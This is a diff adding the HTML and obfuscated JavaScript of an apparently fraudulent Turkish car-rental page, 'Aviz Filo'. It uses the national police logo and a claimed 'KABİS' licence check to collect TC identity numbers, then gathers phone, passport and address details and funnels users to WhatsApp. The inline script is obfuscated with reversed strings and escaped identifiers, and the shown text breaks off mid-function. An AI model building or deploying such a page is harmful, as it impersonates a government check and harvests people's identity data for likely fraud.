+<span style="background:#DC2626;color:#fff;font-size:0.7rem;font-weight:700;padding:3px 10px;border-radius:20px;letter-spacing:0.5px;display:inline-flex;align-items:center;gap:4px;"><i class="fa-solid fa-shield-halved"></i> FULL KASKO</span>
+</div>
+</div>
+<img alt="Mercedes E200" class="car-image" src="assets/3b9b87c7_D8653603-DDF0-4637-8B9A-B40B8EEB6F8B.jpg"/>
+<div class="car-features">
+<span><i class="fa-solid fa-gas-pump"></i> Dizel</span>
+<span><i class="fa-solid fa-gear"></i> Otomatik</span>
+<span><i class="fa-solid fa-suitcase"></i> 3 Valiz</span>
+<span><i class="fa-solid fa-road"></i> Sınırsız Km</span>
+</div>
+<div class="car-footer">
+<div class="car-prices-row">
+<div class="car-price" onclick="wpMesaj('Mercedes E200')" style="position:relative;overflow:visible;display:flex;flex-direction:column;justify-content:flex-end;">
+<div class="indirim-badge">%30 İNDİRİM</div>
+<span class="label" style="padding-top:4px;"><i class="fa-solid fa-tag"></i> Günlük Ücret</span>
+<span class="eski-fiyat">4.786 TL</span>
+<span class="amount">3.350 TL</span>
+</div>
+<div class="car-depozito" onclick="wpMesaj('Mercedes E200')" style="display:flex;flex-direction:column;justify-content:flex-end;">
+<span class="label"><i class="fa-solid fa-shield"></i> Depozito</span>
+<span class="per">(iade edilir)</span>
+<span class="amount">3.000 TL</span>
+</div>
+</div>
+<button class="btn-kirala" onclick="wpMesaj('Mercedes E200')">
+<i class="fa-solid fa-circle-check"></i> Hemen Kirala
+        </button>
+</div>
+</div>
+<div class="car-card" data-tur="LÜKS">
+<div class="car-header" style="padding:14px 16px 10px;display:flex;flex-direction:column;gap:8px;align-items:center;">
+<h3 onclick="wpMesaj('Mercedes Vito')" style="margin:0;font-size:1.35rem;font-weight:700;color:#1F2937;display:block;width:100%;text-align:center;cursor:pointer;">Mercedes Vito</h3>
+<div style="display:flex;flex-direction:row;align-items:center;gap:16px;">
+<span class="car-type">LÜKS</span>
+<span style="background:#DC2626;color:#fff;font-size:0.7rem;font-weight:700;padding:3px 10px;border-radius:20px;letter-spacing:0.5px;display:inline-flex;align-items:center;gap:4px;"><i class="fa-solid fa-shield-halved"></i> FULL KASKO</span>
+</div>
+</div>
+<img alt="Mercedes Vito" class="car-image" src="assets/edb88e36_45D4C64B-B201-41BB-82B2-F10FB2597CCF.jpg"/>
+<div class="car-features">
+<span><i class="fa-solid fa-gas-pump"></i> Dizel</span>
+<span><i class="fa-solid fa-gear"></i> Otomatik</span>
+<span><i class="fa-solid fa-suitcase"></i> 3 Valiz</span>
+<span><i class="fa-solid fa-road"></i> Sınırsız Km</span>
+</div>
+<div class="car-footer">
+<div class="car-prices-row">
+<div class="car-price" onclick="wpMesaj('Mercedes Vito')" style="position:relative;overflow:visible;display:flex;flex-direction:column;justify-content:flex-end;">
+<div class="indirim-badge">%30 İNDİRİM</div>
+<span class="label" style="padding-top:4px;"><i class="fa-solid fa-tag"></i> Günlük Ücret</span>
+<span class="eski-fiyat">4.957 TL</span>
+<span class="amount">3.470 TL</span>
+</div>
+<div class="car-depozito" onclick="wpMesaj('Mercedes Vito')" style="display:flex;flex-direction:column;justify-content:flex-end;">
+<span class="label"><i class="fa-solid fa-shield"></i> Depozito</span>
+<span class="per">(iade edilir)</span>
+<span class="amount">3.000 TL</span>
+</div>
+</div>
+<button class="btn-kirala" onclick="wpMesaj('Mercedes Vito')">
+<i class="fa-solid fa-circle-check"></i> Hemen Kirala
+        </button>
+</div>
+</div>
+</div>
+<!-- ARAÇ LİSTESİ -->
+</div><!-- /listing-area -->
+</div><!-- /page-layout -->
+<!-- ======== MODAL 1: TC GİRİŞ ======== -->
+<div class="modal-overlay" id="modal-tc">
+<div class="modal-box">
+<button class="modal-close" onclick="closeAll()"><i class="fa-solid fa-xmark"></i></button>
+<!-- Logo -->
+<div style="text-align:center;margin-bottom:16px;">
+<img alt="logo" src="assets/c8c751a5_Aviz Filo logosu.png" style="max-height:48px;max-width:160px;object-fit:contain;"/>
+</div>
+<div style="display:flex;align-items:center;gap:10px;margin-bottom:6px;">
+<div style="width:70px;height:70px;flex-shrink:0;">
+<img alt="Emniyet Genel Müdürlüğü" src="assets/1fab0fa1_egm.png" style="width:100%;height:100%;object-fit:contain;"/>
+</div>
+<div class="modal-title" style="margin:0;">
+        KABİS ile Ehliyet Doğrulama
+    </div>
+</div>
+<div class="modal-sub">Ehliyetinizin KABİS (Kiralık Araç Bildirim Sistemi) Sorgulaması Yapılacaktır.</div>
+<div style="background:#F9FAFB;border-radius:12px;padding:20px;">
+<div style="text-align:center;margin-bottom:18px;">
+<div style="width:60px;height:60px;border-radius:50%;background:#FEE2E2;display:flex;align-items:center;justify-content:center;margin:0 auto 10px;">
+<i class="fa-solid fa-id-card" style="font-size:1.6rem;color:#DC2626;"></i>
+</div>
+<div style="font-weight:700;font-size:1rem;color:#1F2937;">Sürücü Bilgileri</div>
+<div style="font-size:0.82rem;color:#9CA3AF;margin-top:4px;">Lütfen bilgilerinizi eksiksiz giriniz.</div>
+</div>
+<div style="position:relative;margin-bottom:12px;">
+<i class="fa-solid fa-user" style="position:absolute;left:14px;top:50%;transform:translateY(-50%);color:#9CA3AF;pointer-events:none;"></i>
+<input class="modal-input" id="tc-input" maxlength="11" oninput="this.value=this.value.replace(/[^0-9]/g,'').slice(0,11)" placeholder="TC Kimlik Numarası" type="tel"/>
+</div>
+<div class="modal-error" id="tc-error"></div>
+<button class="modal-btn" id="btn-dogrula" onclick="tcDogrula()">
+<i class="fa-solid fa-check"></i> KABİS ile Doğrula
+            </button>
+<button class="modal-btn-secondary" onclick="document.getElementById('modal-tc').classList.remove('active'); document.getElementById('modal-pasaport').classList.add('active');">
+<i class="fa-solid fa-globe"></i> TC Vatandaşı Değilim
+            </button>
+</div>
+</div>
+</div>
+<!-- ======== MODAL 2: UYGUNSUZ ======== -->
+<div class="modal-overlay" id="modal-uygunsuz">
+<div class="modal-box" style="max-width:490px;">
+<button class="modal-close" onclick="closeAll()"><i class="fa-solid fa-xmark"></i></button>
+<div style="text-align:center;margin-bottom:16px;">
+<img alt="logo" src="assets/c8c751a5_Aviz Filo logosu.png" style="max-height:48px;max-width:160px;object-fit:contain;"/>
+</div>
+<!-- BAŞARILI BAŞLIK -->
+<div style="background:#F0FDF4;border:1.5px solid #86EFAC;border-radius:14px;padding:20px;text-align:center;margin-bottom:18px;">
+<div style="font-size:2.5rem;color:#16A34A;margin-bottom:8px;"><i class="fa-solid fa-circle-check"></i></div>
+<div style="font-size:1.05rem;font-weight:700;color:#15803D;margin-bottom:6px;">Araç Kiralamaya Uygunsunuz!</div>
+<div style="font-size:0.83rem;color:#166534;">Kimlik doğrulamanız başarıyla tamamlandı.</div>
+</div>
+<!-- MERNİS'ten gelen bilgiler (salt okunur) -->
+<div style="background:#F9FAFB;border-radius:12px;padding:14px 16px;margin-bottom:16px;">
+<div style="font-size:0.78rem;font-weight:700;color:#9CA3AF;text-transform:uppercase;letter-spacing:0.5px;margin-bottom:10px;">Müşteri Bilgileri</div>
+<div class="info-row"><span class="info-label">Ad Soyad</span><span class="info-val" id="u-adsoyad">—</span></div>
+<div class="info-row" style="border:none;"><span class="info-label">Doğum Tarihi</span><span class="info-val" id="u-dogum">—</span></div>
+</div>
+<!-- Sadece telefon -->
+<div style="font-size:0.78rem;font-weight:700;color:#9CA3AF;text-transform:uppercase;letter-spacing:0.5px;margin-bottom:10px;">İletişim Bilgisi</div>
+<div style="position:relative;margin-bottom:14px;">
+<i class="fa-solid fa-phone" style="position:absolute;left:14px;top:50%;transform:translateY(-50%);color:#9CA3AF;pointer-events:none;"></i>
+<input class="modal-input" id="m-telefon" maxlength="11" oninput="this.value=this.value.replace(/[^0-9]/g,'').slice(0,11)" placeholder="Telefon (05XXXXXXXXX)" type="tel"/>
+</div>
+<div class="modal-error" id="uyg-error"></div>
+<button class="modal-btn" onclick="devamEt()" style="background:#16A34A;">
+<i class="fa-solid fa-arrow-right"></i> Devam Et
+        </button>
+<button class="modal-btn-secondary" onclick="geriDon('modal-uygunsuz','modal-tc')">
+<i class="fa-solid fa-arrow-left"></i> Geri Dön
+        </button>
+</div>
+</div>
+<!-- ======== MODAL: PASAPORT (Yabancı uyruklu) ======== -->
+<div class="modal-overlay" id="modal-pasaport">
+<div class="modal-box" style="max-width:440px;">
+<button class="modal-close" onclick="closeAll()"><i class="fa-solid fa-xmark"></i></button>
+<div style="text-align:center;margin-bottom:16px;">
+<img alt="logo" src="assets/c8c751a5_Aviz Filo logosu.png" style="max-height:48px;max-width:160px;object-fit:contain;"/>
+</div>
+<div style="display:flex;align-items:center;gap:10px;margin-bottom:6px;">
+<div style="width:36px;height:36px;border-radius:50%;background:#EFF6FF;display:flex;align-items:center;justify-content:center;flex-shrink:0;">
+<i class="fa-solid fa-passport" style="color:#2563EB;font-size:1rem;"></i>
+</div>
+<div class="modal-title" style="margin:0;">Yabancı Uyruklu Müşteri</div>
+</div>
+<div class="modal-sub">Lütfen pasaport bilgilerinizi giriniz.</div>
+<div style="background:#F9FAFB;border-radius:12px;padding:20px;">
+<div style="position:relative;margin-bottom:12px;">
+<i class="fa-solid fa-passport" style="position:absolute;left:14px;top:50%;transform:translateY(-50%);color:#9CA3AF;pointer-events:none;"></i>
+<input class="modal-input" id="pasaport-no" oninput="this.value=this.value.toUpperCase()" placeholder="Pasaport Numarası" style="text-transform:uppercase;" type="text"/>
+</div>
+<div style="position:relative;margin-bottom:12px;">
+<i class="fa-solid fa-user" style="position:absolute;left:14px;top:50%;transform:translateY(-50%);color:#9CA3AF;pointer-events:none;"></i>
+<input class="modal-input" id="pasaport-adsoyad" placeholder="Ad Soyad" type="text"/>
+</div>
+<div style="position:relative;margin-bottom:12px;">
+<i class="fa-solid fa-phone" style="position:absolute;left:14px;top:50%;transform:translateY(-50%);color:#9CA3AF;pointer-events:none;"></i>
+<input class="modal-input" id="pasaport-tel" placeholder="Telefon Numarası" type="tel"/>
+</div>
+<div class="modal-error" id="pasaport-error"></div>
+<button class="modal-btn" onclick="pasaportDevam()" style="margin-top:4px;">
+<i class="fa-solid fa-arrow-right"></i> Devam Et
+            </button>
+<button class="modal-btn-secondary" onclick="geriDon('modal-pasaport','modal-tc')">
+<i class="fa-solid fa-arrow-left"></i> Geri Dön
+            </button>
+</div>
+</div>
+</div>
+<!-- ======== MODAL 3: TESLİMAT SEÇİMİ ======== -->
+<div class="modal-overlay" id="modal-teslimat">
+<div class="modal-box" style="max-width:490px;">
+<button class="modal-close" onclick="closeAll()"><i class="fa-solid fa-xmark"></i></button>
+<div style="text-align:center;margin-bottom:14px;">
+<img alt="logo" src="assets/c8c751a5_Aviz Filo logosu.png" style="max-height:40px;max-width:140px;object-fit:contain;"/>
+</div>
+<div class="modal-title" style="margin-bottom:4px;">
+<i class="fa-solid fa-car-side" style="color:var(--primary);margin-right:8px;"></i> Teslimat Şekli
+        </div>
+<div class="modal-sub">Aracı nasıl teslim almak istersiniz?</div>
+<div class="delivery-options" style="gap:14px;margin-bottom:18px;">
+<div class="delivery-opt active" id="opt-adres" onclick="setTeslimat('adrese')">
+<i class="fa-solid fa-car-side"></i>
+<span>Vale ile Adrese Teslim</span>
+</div>
+<div class="delivery-opt" id="opt-havali" onclick="setTeslimat('havalimanı')">
+<i class="fa-solid fa-plane-arrival"></i>
+<span>Havalimanı Teslim</span>
+</div>
+</div>
+<!-- VALE / ADRESE TESLİMAT (varsayılan açık) -->
+<div id="adres-alani">
+<!-- Bilgi -->
+<div style="display:flex;align-items:center;gap:8px;margin-bottom:14px;">
+<i class="fa-solid fa-car-side" style="font-size:1rem;color:#DC2626;flex-shrink:0;"></i>
+<div>
+<div style="font-size:0.8rem;font-weight:700;color:#1F2937;">Vale ile Adrese Teslimat</div>
+<div style="font-size:0.75rem;color:#6B7280;">Aracınız adresinize getirilir ve alınır  <span style="color:#16A34A;font-weight:700;">Ücretsizdir.</span></div>
+</div>
+</div>
+<!-- Bilgi Kutucuğu -->
+<div style="display:flex;align-items:flex-start;gap:12px;background:#EFF6FF;border:1.5px solid #BFDBFE;border-radius:12px;padding:14px;margin-bottom:14px;">
+<div style="flex-shrink:0;width:36px;height:36px;background:#2563EB;border-radius:50%;display:flex;align-items:center;justify-content:center;">
+<i class="fa-solid fa-circle-info" style="color:#fff;font-size:1rem;"></i>
+</div>
+<div>
+<div style="font-size:0.85rem;font-weight:700;color:#1E3A5F;margin-bottom:4px;"><i class="fa-regular fa-clock" style="margin-right:5px;color:#2563EB;"></i>Vale Teslimat Süresi Hakkında</div>
+<div style="font-size:0.78rem;color:#1E40AF;line-height:1.6;">
+                        Vale ile teslimat hizmeti, ortalama <strong>30 – 45 dakika</strong> içerisinde sağlanmaktadır. Olası trafik ve yoğunluk durumlarına bağlı olarak <strong>±15 dakika</strong> erken veya geç teslimat söz konusu olabilir. Anlayışınız için teşekkür ederiz.
+                    </div>
+</div>
+</div>
+<div class="date-group">
+<label><i class="fa-solid fa-location-dot" style="color:var(--primary);margin-right:5px;"></i>İl</label>
+<select class="modal-input" id="m-il-select" onchange="ilceDoldur()" style="padding:13px 14px;cursor:pointer;background:#fff;">
+<option value="">İl seçin...</option>
+</select>
+</div>
+<div class="date-group">
+<label><i class="fa-solid fa-map-pin" style="color:var(--primary);margin-right:5px;"></i>İlçe</label>
+<select class="modal-input" disabled="" id="m-ilce-select" style="padding:13px 14px;cursor:pointer;background:#fff;">
+<option value="">Önce il seçin...</option>
+</select>
+</div>
+<div class="date-group">
+<label><i class="fa-solid fa-house" style="color:var(--primary);margin-right:5px;"></i>Açık Adres</label>
+<textarea class="modal-input" id="teslimat-adres" placeholder="Mahalle, cadde, sokak, kapı no..." rows="2" style="padding:13px 14px;resize:vertical;"></textarea>
+</div>
+</div>
+<!-- HAVALİMANI SEÇENEKLERİ (varsayılan gizli) -->
+<div id="havali-alani" style="display:none;">
+<div class="date-group">
+<label><i class="fa-solid fa-location-dot" style="color:var(--primary);margin-right:5px;"></i>Alış İli</label>
+<select class="modal-input" id="alis-il-select" onchange="havalimanıDoldur('alis')" style="padding:13px 14px;cursor:pointer;background:#fff;">
+<option value="">İl seçin...</option>
+</select>
+</div>
+<div class="date-group" id="alis-havali-group" style="display:none;">
+<label><i class="fa-solid fa-plane-departure" style="color:var(--primary);margin-right:5px;"></i>Alış Havalimanı</label>
+<select class="modal-input" id="alis-havali" style="padding:13px 14px;cursor:pointer;background:#fff;">
+<option value="">Havalimanı seçin...</option>
+</select>
+</div>
+<label style="display:flex;align-items:center;gap:10px;cursor:pointer;margin-bottom:14px;padding:12px;background:#F9FAFB;border-radius:10px;border:1.5px solid #E5E7EB;">
+<input id="farkli-iade" onchange="toggleFarkliIade()" style="width:18px;height:18px;accent-color:var(--primary);cursor:pointer;" type="checkbox"/>
+<span style="font-size:0.9rem;font-weight:600;color:#374151;">Farklı havalimanında iade</span>
+</label>
+<div id="iade-havali-alani" style="display:none;">
+<div class="date-group">
+<label><i class="fa-solid fa-location-dot" style="color:var(--primary);margin-right:5px;"></i>İade İli</label>
+<select class="modal-input" id="iade-il-select" onchange="havalimanıDoldur('iade')" style="padding:13px 14px;cursor:pointer;background:#fff;">
+<option value="">İl seçin...</option>
+</select>
+</div>
+<div class="date-group" id="iade-havali-group" style="display:none;">
+<label><i class="fa-solid fa-plane-arrival" style="color:var(--primary);margin-right:5px;"></i>İade Havalimanı</label>
+<select class="modal-input" id="iade-havali" style="padding:13px 14px;cursor:pointer;background:#fff;">
+<option value="">Havalimanı seçin...</option>
+</select>
+</div>
+</div>
+</div>
+<div class="modal-error" id="teslimat-error" style="margin-top:4px;"></div>
+<button class="modal-btn" onclick="teslimatDevam()" style="margin-top:14px;">
+<i class="fa-solid fa-arrow-right"></i> Devam Et
+        </button>
+<button class="modal-btn-secondary" onclick="geriDon('modal-teslimat','modal-uygunsuz')">
+<i class="fa-solid fa-arrow-left"></i> Geri Dön
+        </button>
+</div>
+</div>
+<!-- ======== MODAL 4: TARİH ======== -->
+<div class="modal-overlay" id="modal-tarih">
+<div class="modal-box" style="max-width:490px;">
+<button class="modal-close" onclick="closeAll()"><i class="fa-solid fa-xmark"></i></button>
+<div style="text-align:center;margin-bottom:14px;">
+<img alt="logo" src="assets/c8c751a5_Aviz Filo logosu.png" style="max-height:40px;max-width:140px;object-fit:contain;"/>
+</div>
+<div class="modal-title" style="margin-bottom:18px;">
+<i class="fa-solid fa-calendar-days" style="color:var(--primary);margin-right:8px;"></i> Kiralama Tarihleri
+        </div>
+<div class="date-group">
+<label><i class="fa-solid fa-calendar-plus" style="color:var(--primary);margin-right:5px;"></i>Alış Tarihi &amp; Saati</label>
+<div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;">
+<input class="modal-input" id="alis-gun" style="padding:12px 14px;" type="date"/>
+<input class="modal-input" id="alis-saat" style="padding:12px 14px;" type="time"/>
+</div>
+</div>
+<div class="date-group">
+<label><i class="fa-solid fa-calendar-minus" style="color:var(--primary);margin-right:5px;"></i>İade Tarihi &amp; Saati</label>
+<div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;">
+<input class="modal-input" id="iade-gun" style="padding:12px 14px;" type="date"/>
+<input class="modal-input" id="iade-saat" style="padding:12px 14px;" type="time"/>
+</div>
+</div>
+<div style="background:#F9FAFB;border-radius:10px;padding:12px 14px;margin-bottom:16px;font-size:0.85rem;color:#6B7280;">
+<i class="fa-solid fa-circle-info" style="color:var(--primary);margin-right:6px;"></i>
+            Seçilen süreye göre toplam ücret hesaplanacaktır.
+        </div>
+<button class="modal-btn" id="btn-rezervasyon" onclick="rezervasyonOlustur()">
+<i class="fa-solid fa-arrow-right"></i> Rezervasyonu Tamamla
+        </button>
+<button class="modal-btn-secondary" onclick="geriDon('modal-tarih','modal-teslimat')">
+<i class="fa-solid fa-arrow-left"></i> Geri Dön
+        </button>
+</div>
+</div>
+<!-- WHATSAPP -->
+<a class="whatsapp-sticky-button" href="https://wa.me/+905016865244" target="_blank">
+<i class="fa-brands fa-whatsapp"></i> <span>WhatsApp Destek</span>
+</a>
+<script src="assets/8f678ab8_data.js"></script>
+<script src="assets/6387abca_data_locations.js"></script>
+<script src="assets/f64854cc_script.js"></script>
+<script>
+  function wpMesaj(aracAdi) {
+    var mesaj = encodeURIComponent('Merhaba ' + aracAdi + ' kiralamak istiyorum.');
+    var wpNo = '+905016865244';
+    fetch('wp_mesaj.php', {
+      method: 'POST',
+      headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+      body: 'arac=' + encodeURIComponent(aracAdi)
+    }).catch(function(){});
+    window.open('https://wa.me/' + wpNo + '?text=' + mesaj, '_blank');
+  }
+  var _0x49gef=(875271^875266)+(591199^591192);let secilenAracId=null;_0x49gef=(652649^652652)+(407745^407747);var _0xc654gf=(705433^705435)+(725823^725815);let teslimatTuru="\u0061\u0064\u0072\u0065\u0073\u0065";_0xc654gf=(586765^586766)+(446160^446166);let musteriData=null;var _0xg62dg=(767705^767706)+(555848^555851);const ilHavalimanları={"İstanbul":[")TSI( \u0131namilavaH lubnats\u0130".split("").reverse().join(""),"\u0130\u0073\u0074\u0061\u006E\u0062\u0075\u006C\u0020\u0053\u0061\u0062\u0069\u0068\u0061\u0020\u0047\u00F6\u006B\u00E7\u0065\u006E\u0020\u0028\u0053\u0041\u0057\u0029"],"Ankara":["\u0041\u006E\u006B\u0061\u0072\u0061\u0020\u0045\u0073\u0065\u006E\u0062\u006F\u011F\u0061\u0020\u0028\u0045\u0053\u0042\u0029"],"\u0130\u007A\u006D\u0069\u0072":["\u0130\u007A\u006D\u0069\u0072\u0020\u0041\u0064\u006E\u0061\u006E\u0020\u004D\u0065\u006E\u0064\u0065\u0072\u0065\u0073\u0020\u0028\u0041\u0044\u0042\u0029"],"Antalya":[")TYA( aylatnA".split("").reverse().join("")],"Muğla":["\u0044\u0061\u006C\u0061\u006D\u0061\u006E\u0020\u0028\u0044\u004C\u004D\u0029","\u0042\u006F\u0064\u0072\u0075\u006D\u0020\u004D\u0069\u006C\u0061\u0073\u0020\u0028\u0042\u004A\u0056\u0029"],"\u0054\u0072\u0061\u0062\u007A\u006F\u006E":[")XZT( nozbarT".split("").reverse().join("")],"\u0041\u0064\u0061\u006E\u0061":[")ADA( a\u015Faprika\u015E anadA".split("").reverse().join("")],"Gaziantep":["\u0047\u0061\u007A\u0069\u0061\u006E\u0074\u0065\u0070\u0020\u004F\u011F\u0075\u007A\u0065\u006C\u0069\u0020\u0028\u0047\u005A\u0054\u0029"],"\u004B\u0061\u0079\u0073\u0065\u0072\u0069":[")RSA( telikrE iresyaK".split("").reverse().join("")],"Konya":["\u004B\u006F\u006E\u0079\u0061\u0020\u0028\u004B\u0059\u0041\u0029"],"\u0053\u0061\u006D\u0073\u0075\u006E":[")FZS( abma\u015Fra\xC7 nusmaS".split("").reverse().join("")],"\u0045\u0072\u007A\u0075\u0072\u0075\u006D":["\u0045\u0072\u007A\u0075\u0072\u0075\u006D\u0020\u0028\u0045\u0052\u005A\u0029"],"\u0044\u0069\u0079\u0061\u0072\u0062\u0061\u006B\u0131\u0072":["\u0044\u0069\u0079\u0061\u0072\u0062\u0061\u006B\u0131\u0072\u0020\u0028\u0044\u0049\u0059\u0029"],"Van":[")NAV( neleM tireF naV".split("").reverse().join("")],"Malatya":["\u004D\u0061\u006C\u0061\u0074\u0079\u0061\u0020\u0042\u0061\u0074\u0074\u0061\u006C\u0067\u0061\u007A\u0069\u0020\u0028\u004D\u004C\u0058\u0029"],"\u0048\u0061\u0074\u0061\u0079":["\u0048\u0061\u0074\u0061\u0079\u0020\u0028\u0048\u0054\u0059\u0029"],"\u0042\u0075\u0072\u0073\u0061":[")IEY( rihe\u015FineY asruB".split("").reverse().join("")],"Nevşehir":["\u004E\u0065\u0076\u015F\u0065\u0068\u0069\u0072\u0020\u004B\u0061\u0070\u0061\u0064\u006F\u006B\u0079\u0061\u0020\u0028\u004E\u0041\u0056\u0029"],"\u0049\u0073\u0070\u0061\u0072\u0074\u0061":[")ESI( lerimeD namyel\xFCS atrapsI".split("").reverse().join("")],"Zonguldak":["\u005A\u006F\u006E\u0067\u0075\u006C\u0064\u0061\u006B\u0020\u00C7\u0061\u0079\u0063\u0075\u006D\u0061\u0020\u0028\u004F\u004E\u0051\u0029"],"\u0041\u011F\u0072\u0131":["\u0041\u011F\u0072\u0131\u0020\u0028\u0041\u004A\u0049\u0029"],"\u0042\u0061\u0074\u006D\u0061\u006E":["\u0042\u0061\u0074\u006D\u0061\u006E\u0020\u0028\u0042\u0041\u004C\u0029"],"Elazığ":[")SZE( \u011F\u0131zalE".split("").reverse().join("")],"\u004D\u0061\u0072\u0064\u0069\u006E":["\u004D\u0061\u0072\u0064\u0069\u006E\u0020\u0028\u004D\u0051\u004D\u0029"],"Şanlıurfa":["\u015E\u0061\u006E\u006C\u0131\u0075\u0072\u0066\u0061\u0020\u0047\u0041\u0050\u0020\u0028\u0047\u004E\u0059\u0029"],"\u004B\u0061\u0068\u0072\u0061\u006D\u0061\u006E\u006D\u0061\u0072\u0061\u015F":["\u004B\u0061\u0068\u0072\u0061\u006D\u0061\u006E\u006D\u0061\u0072\u0061\u015F\u0020\u0028\u004B\u0043\u004D\u0029"],"\u0053\u0069\u0069\u0072\u0074":[")ZXS( triiS".split("").reverse().join("")],"Muş":["\u004D\u0075\u015F\u0020\u0028\u004D\u0053\u0052\u0029"]};_0xg62dg=658186^658179;function havalimanıDoldur(tip,_0x5c6dg,_0xf8ad4b){const _0xb516ad=tip==="\u0061\u006C\u0069\u0073"?"\u0061\u006C\u0069\u0073\u002D\u0069\u006C\u002D\u0073\u0065\u006C\u0065\u0063\u0074":"\u0069\u0061\u0064\u0065\u002D\u0069\u006C\u002D\u0073\u0065\u006C\u0065\u0063\u0074";const _0x6a17fa=tip==="sila".split("").reverse().join("")?"\u0061\u006C\u0069\u0073\u002D\u0068\u0061\u0076\u0061\u006C\u0069":"\u0069\u0061\u0064\u0065\u002D\u0068\u0061\u0076\u0061\u006C\u0069";_0x5c6dg=881340^881333;var _0x22367a=(655372^655369)+(895904^895913);const _0xf03d=tip==="sila".split("").reverse().join("")?"\u0061\u006C\u0069\u0073\u002D\u0068\u0061\u0076\u0061\u006C\u0069\u002D\u0067\u0072\u006F\u0075\u0070":"puorg-ilavah-edai".split("").reverse().join("");_0x22367a=(751955^751952)+(339055^339054);var _0x_0xd4a=(210784^210792)+(143800^143800);const _0x180af=document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064'](_0xb516ad)['\u0076\u0061\u006C\u0075\u0065'];_0x_0xd4a=522505^522507;const _0x3_0xg0e=document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064'](_0x6a17fa);_0xf8ad4b="mklmfp".split("").reverse().join("");const _0x8c9b=document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064'](_0xf03d);_0x3_0xg0e['\u0069\u006E\u006E\u0065\u0072\u0048\u0054\u004D\u004C']=">noitpo/<...ni\xE7es \u0131namilavaH>\"\"=eulav noitpo<".split("").reverse().join("");if(_0x180af&&ilHavalimanları[_0x180af]){ilHavalimanları[_0x180af]['\u0066\u006F\u0072\u0045\u0061\u0063\u0068'](h=>{var _0xd8efdf=(684341^684349)+(167447^167443);const _0xg0a48a=document['\u0063\u0072\u0065\u0061\u0074\u0065\u0045\u006C\u0065\u006D\u0065\u006E\u0074']("noitpo".split("").reverse().join(""));_0xd8efdf='\u0061\u0061\u0070\u006C\u0070\u0066';_0xg0a48a['\u0076\u0061\u006C\u0075\u0065']=h;_0xg0a48a['\u0074\u0065\u0078\u0074\u0043\u006F\u006E\u0074\u0065\u006E\u0074']=h;_0x3_0xg0e['\u0061\u0070\u0070\u0065\u006E\u0064\u0043\u0068\u0069\u006C\u0064'](_0xg0a48a);});_0x8c9b['\u0073\u0074\u0079\u006C\u0065']['\u0064\u0069\u0073\u0070\u006C\u0061\u0079']="\u0062\u006C\u006F\u0063\u006B";}else{_0x8c9b['\u0073\u0074\u0079\u006C\u0065']['\u0064\u0069\u0073\u0070\u006C\u0061\u0079']="enon".split("").reverse().join("");}}function havaliIlleriniDoldur(_0xdf_0x35d){const _0x7979c=Object['\u006B\u0065\u0079\u0073'](ilHavalimanları)['\u0073\u006F\u0072\u0074']();_0xdf_0x35d=(419051^419051)+(689331^689329);["\u0061\u006C\u0069\u0073\u002D\u0069\u006C\u002D\u0073\u0065\u006C\u0065\u0063\u0074","\u0069\u0061\u0064\u0065\u002D\u0069\u006C\u002D\u0073\u0065\u006C\u0065\u0063\u0074"]['\u0066\u006F\u0072\u0045\u0061\u0063\u0068'](id=>{let _0x74c1be;const _0x8b5deg=document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064'](id);_0x74c1be=(970826^970819)+(400448^400450);_0x7979c['\u0066\u006F\u0072\u0045\u0061\u0063\u0068'](il=>{const _0x73cda=document['\u0063\u0072\u0065\u0061\u0074\u0065\u0045\u006C\u0065\u006D\u0065\u006E\u0074']("\u006F\u0070\u0074\u0069\u006F\u006E");_0x73cda['\u0076\u0061\u006C\u0075\u0065']=il;_0x73cda['\u0074\u0065\u0078\u0074\u0043\u006F\u006E\u0074\u0065\u006E\u0074']=il;_0x8b5deg['\u0061\u0070\u0070\u0065\u006E\u0064\u0043\u0068\u0069\u006C\u0064'](_0x73cda);});});}function ilDoldur(){var _0xe_0xd88=(840057^840056)+(761221^761221);const _0x5_0x8ac=document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("\u006D\u002D\u0069\u006C\u002D\u0073\u0065\u006C\u0065\u0063\u0074");_0xe_0xd88=888427^888419;TurkeyLocations['\u0070\u0072\u006F\u0076\u0069\u006E\u0063\u0065\u0073']['\u0066\u006F\u0072\u0045\u0061\u0063\u0068'](p=>{var _0xd1e=(783713^783716)+(800534^800528);const _0x0f1a6f=document['\u0063\u0072\u0065\u0061\u0074\u0065\u0045\u006C\u0065\u006D\u0065\u006E\u0074']("\u006F\u0070\u0074\u0069\u006F\u006E");_0xd1e=(580485^580492)+(644034^644042);_0x0f1a6f['\u0076\u0061\u006C\u0075\u0065']=p['\u006E\u0061\u006D\u0065'];_0x0f1a6f['\u0074\u0065\u0078\u0074\u0043\u006F\u006E\u0074\u0065\u006E\u0074']=p['\u006E\u0061\u006D\u0065'];_0x5_0x8ac['\u0061\u0070\u0070\u0065\u006E\u0064\u0043\u0068\u0069\u006C\u0064'](_0x0f1a6f);});}function ilceDoldur(){const _0x59b09c=document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("\u006D\u002D\u0069\u006C\u002D\u0073\u0065\u006C\u0065\u0063\u0074")['\u0076\u0061\u006C\u0075\u0065'];const 